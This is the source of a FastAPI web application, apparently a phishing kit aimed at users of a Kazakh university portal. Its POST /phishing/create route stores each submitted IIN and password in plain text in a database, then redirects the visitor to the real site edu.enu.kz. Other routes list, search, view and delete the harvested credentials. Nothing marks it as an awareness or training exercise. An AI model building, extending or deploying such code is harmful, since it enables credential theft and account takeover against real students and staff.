import os
from pathlib import Path

from fastapi import Depends, FastAPI, Form, Request
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from sqlalchemy.orm import Session

try:
    from .db import Base, engine, get_db
    from .models import Fishing
    from .services import delete_fishing, get_fishing_by_id, list_fishings, save_fishing
except ImportError:  # Allow running as a script (python main.py)
    from db import Base, engine, get_db
    from models import Fishing
    from services import delete_fishing, get_fishing_by_id, list_fishings, save_fishing


BASE_DIR = Path(__file__).resolve().parent
templates = Jinja2Templates(directory=str(BASE_DIR / "templates"))

app = FastAPI()

Base.metadata.create_all(bind=engine)

app.mount("/css", StaticFiles(directory=str(BASE_DIR / "static" / "css")), name="css")
app.mount("/fonts", StaticFiles(directory=str(BASE_DIR / "static" / "fonts")), name="fonts")
app.mount("/images", StaticFiles(directory=str(BASE_DIR / "static" / "images")), name="images")


@app.get("/index/", response_class=HTMLResponse)
def index(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})


@app.get("/", response_class=HTMLResponse)
def fishing(request: Request):
    return templates.TemplateResponse("fishings.html", {"request": request})


@app.get("/phishingsAll/", response_class=HTMLResponse)
def fishing_all(request: Request, iin: str | None = None, db: Session = Depends(get_db)):
    fishings = list_fishings(db, iin)
    return templates.TemplateResponse(
        "fishingsall.html", {"request": request, "fishings": fishings}
    )


@app.get("/phishing/{fishing_id}", response_class=HTMLResponse)
def fishing_info(
    request: Request, fishing_id: int, db: Session = Depends(get_db)
):
    fishing_item = get_fishing_by_id(db, fishing_id)
    return templates.TemplateResponse(
        "fishinginfo.html", {"request": request, "fishing": fishing_item}
    )


@app.post("/phishing/create")
def create_fishing(
    iin: str = Form(...),
    password: str = Form(...),
    db: Session = Depends(get_db),
):
    fishing_item = Fishing(iin=iin, password=password)
    save_fishing(db, fishing_item)
    return RedirectResponse(url="https://edu.enu.kz", status_code=303)


@app.post("/phishing/delete/{fishing_id}")
def delete_fishing_route(fishing_id: int, db: Session = Depends(get_db)):
    delete_fishing(db, fishing_id)
    return RedirectResponse(url="/phishingsAll/", status_code=303)


if __name__ == "__main__":
    import uvicorn

    port = int(os.getenv("PORT", "8000"))
    # Use import string when reload is enabled.
    module_path = "main:app" if not __package__ else f"{__package__}.main:app"
    uvicorn.run(module_path, host="localhost", port=port, reload=True)
